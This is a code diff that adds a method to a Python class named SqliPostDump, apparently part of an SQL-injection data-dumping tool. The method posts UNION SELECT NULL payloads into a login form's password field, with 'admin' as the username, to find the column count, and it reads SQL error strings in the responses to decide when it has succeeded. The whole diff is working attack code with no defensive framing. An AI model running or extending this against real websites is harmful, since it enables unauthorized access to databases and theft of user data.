@@ -195,3 +195,21 @@ class SqliPostDump:
             if m in text and "type=\"password\"" not in text:
                 return True
         return False
+
+    def _find_union_cols(self, http, url, form):
+        """Перебор UNION SELECT NULL x N — пока не пропадёт SQL-ошибка."""
+        for n in range(1, 11):
+            cols = ",".join(["NULL"] * n)
+            payload = f"' UNION SELECT {cols}-- -"
+            data = {form["user_field"]: "admin", form["pass_field"]: payload}
+            r = http.post(url, data=data, allow_redirects=True)
+            if not r:
+                continue
+            low = r.text.lower()
+            has_error = any(m in low for m in [
+                "sql syntax", "unknown column", "syntax error",
+                "sqlstate", "invalid column", "union select",
+            ])
+            if not has_error and r.status_code == 200:
+                return n
+        return 0
